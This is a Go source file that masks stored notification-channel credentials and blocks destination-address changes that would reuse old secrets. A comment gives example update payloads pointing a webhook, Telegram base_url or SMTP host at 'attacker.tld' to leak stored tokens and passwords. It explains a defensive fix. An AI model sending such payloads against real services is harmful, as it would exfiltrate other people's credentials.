package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix is the marker prefix for a masked value. When the API echoes a credential it
// replaces the real content with a value carrying this prefix, and when the update interface
// receives a value carrying this prefix it understands it as "keep the existing DB value unchanged".
//
// A prefix is used rather than an empty string or some fixed constant so that a bit of recognizable
// info can be carried along (see MaskedValue), letting the user tell "which bot this is" without
// re-pasting the secret.
const MaskedPrefix = "__masked__"

// MaskedValue produces a masked value:
//
//	"__masked__"              the original value is too short, no hint given
//	"__masked__:…ab12cd"      carries the last 6 chars of the original as a recognition hint
//
// Exposing only the last 6 chars is a deliberate choice: the recognizable info of a Webhook address
// is in the tail (such as WeCom's key or Feishu's bot id), while the prefix part is the same across
// bots and has no recognition value. The last 6 chars are insufficient to reconstruct the
// credential, but enough for the configurer to recognize "that's my group".
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked reports whether a value is a masked value (i.e. unmodified after the interface echoed it).
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig returns a copy of the config with this channel's credential fields replaced by masked
// values.
//
// An unknown channel type returns an empty map rather than the original config — it is better to
// have the UI show "config unavailable" than to spit the whole original content, which may contain
// credentials, back out when the channel type cannot be recognized. Non-credential fields are kept
// as-is so the UI can display normally.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// A nested structure like headers is treated as one credential as a whole: judging each
		// sub-key would require each channel to declare another set of "which sub-keys are
		// credentials" rules, a complexity far exceeding the benefit.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials means "the target address changed, but the caller did not
// make a statement about the credential fields". It is returned rather than silently allowing or
// silently dropping the credentials, for the reason in PrepareConfigUpdate.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // the destination keys that changed
	Missing []string // the credential keys with no explicit statement
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "the target address (" + strings.Join(e.Changed, ", ") + ") has changed; please re-enter the credential fields (" +
		strings.Join(e.Missing, ", ") + ") as well: fill in a new value, or explicitly leave empty to indicate credentials are no longer needed. " +
		"The original credential is only valid for the old address, and continuing to use it is equivalent to handing it to the new address."
}

// PrepareConfigUpdate merges a channel config and handles the security-sensitive case of a "target
// address change".
//
// It replaces the bare MergeConfig on the channel-update path, solving a path proven workable in
// practice: the target address (where the message is sent) and the credentials (what identity it is
// sent with) are two independent sets of fields, while MergeConfig keeps the existing DB value for
// any "key not mentioned". So anyone who can PATCH a channel only has to **change the address and
// say nothing about the credentials** to make the server send the real credentials from the DB to
// an endpoint they control:
//
//	webhook  {config:{url:"https://attacker.tld"}}  → the original Authorization header egresses with the request
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<real Token>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    → hands over the username and password after STARTTLS
//
// This path is completely silent and does not depend on a redirect (so rejecting a cross-host jump
// does not stop it), and it directly pierces the goal of this package's masking mechanism — "do not
// echo credentials to the browser".
//
// Rule: as soon as a destination key is changed to a new value, the caller must make an explicit
// statement about **every** credential key:
//   - give a new value → use the new value
//   - explicitly pass an empty string → that field no longer needs a credential (keeps the clear
//     semantics)
//   - echo the masked value as-is / simply not mention this key → rejected
//
// The third is also rejected because the meaning of a "masked value" is exactly "keep using the old
// credential", and the old credential is only valid for the old address. It deliberately does not do
// "auto-drop the credential" here — for an optional credential field (webhook's headers, email's
// password) that would silently become "auth is gone but the interface returns 200", harder to
// diagnose than an error. Better to have the operator fill it in once more.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("channel type %q is not registered", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// If a masked literal is embedded in a non-string credential value (such as webhook's headers,
	// which is an object), the caller stuffed the "keep original" sentinel inside the struct.
	// MergeConfig only recognizes "a string with the prefix" as masked, and this form would be
	// stored as an ordinary object as-is — the literal "__masked__" really lands in the DB, and
	// subsequent auth silently breaks with no error. Better to reject it.
	//
	// This check must come **first**: when the address is unchanged it takes the early return, and
	// placing it later would mean only covering the "change the address" path (the first version
	// placed it wrong, and the test caught it directly).
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// Find the destination keys that were actually changed. A masked value equals "unchanged".
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// The address is unchanged, so take the ordinary merge (a masked value keeps the original,
		// an empty string clears, the rest overwrite).
		return MergeConfig(stored, incoming), nil
	}

	// The address changed: require an explicit statement for every credential key.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers rejects submitting the masked sentinel embedded in a non-string structure.
//
// The masking mechanism's premise is "the whole value is a string". An object field like webhook's
// headers can only be masked as a whole (written as the string "__masked__") or submitted as a
// whole; stuffing the sentinel inside the object can neither express "keep unchanged" nor avoid
// being stored as a real value in the DB.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("the content of field %s contains the mask marker %q: this field can only be left empty as a whole to keep the original, or submitted as a whole with a new value; a mask placeholder cannot be embedded inside the struct",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue compares whether two config values are equivalent. It compares via JSON
// serialization to incidentally handle type differences — the port submitted by the frontend is a
// number, while the one read back from the DB is a float64, and a direct == would misjudge.
//
// "Blank" must be normalized before comparing: an empty string and "the key does not exist" are the
// same state in this config model, because MergeConfig treats an empty string as an explicit clear
// and deletes the key directly. Without normalization, an optional destination field that is always
// left blank (Telegram's base_url is the only such field: blank means use the official address)
// would take this path —
//
//	on create base_url:"" is stored  →  the first save has MergeConfig delete the key
//	→ on the second save incoming is "" and stored lacks the key, judged as "the address changed"
//	→ the credential is a masked value → 400 "the target address has changed; please re-enter the credential fields"
//
// After that every save fails unless the user re-pastes the Bot Token, having changed nothing.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue judges whether a config value is "blank".
// The measure must match MergeConfig's clear judgment (strings.TrimSpace(s) == ""), otherwise there
// is a gap where "MergeConfig thinks it should be deleted, sameConfigValue thinks it has a value".
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig merges incoming on top of stored, for updating a channel config.
//
// Rules:
//   - a key in incoming whose value is masked → keep stored's original value (the user did not
//     change this field)
//   - a key in incoming whose value is an empty string → treated as an explicit clear, delete the key
//   - all other keys → overwrite with incoming's value
//   - a key present in stored but not in incoming → keep it (partial-update semantics)
//
// Whether an empty string counts as a "clear" needs to be explicit: the frontend form submits an
// unfilled field as an empty string, and treating it as a valid value to write would really clear a
// field that was "left blank to keep the original". The explicit clear is chosen here because, to
// clear a misconfigured field, the user has no other way to express it (dragging a field away could
// distinguish "not provided" from "provided empty", but the UI does not use that distinction).
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // masked value = unmodified, keep stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
